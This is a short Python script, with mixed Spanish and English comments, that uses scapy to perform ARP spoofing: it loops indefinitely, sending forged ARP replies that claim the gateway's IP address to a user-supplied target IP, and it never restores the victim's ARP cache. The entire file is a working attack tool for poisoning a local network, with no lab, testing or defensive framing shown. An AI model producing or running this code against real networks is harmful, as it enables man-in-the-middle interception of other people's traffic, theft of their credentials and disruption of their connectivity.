#validación

from scapy.all import ARP, send
import time

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    try:
        while True:
            # Building a fake ARP package
            arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, op='is-at')
            # Send ARP fake package with scapy function
            send(arp_response, verbose=0, iface=interface)
            # Wait 2 sec until next try
            time.sleep(2)
    except KeyboardInterrupt:
        # If interrupt/stop command is sent, spoofing get stopped
        print("\nARP spoofing detenido")

if __name__ == "__main__":
    # Request target IP and Gateway(router) IP's
    target_ip = input("Ingrese la IP objetivo: ")
    gateway_ip = input("Ingrese la IP del gateway(router): ")

    arp_spoof(target_ip, gateway_ip)
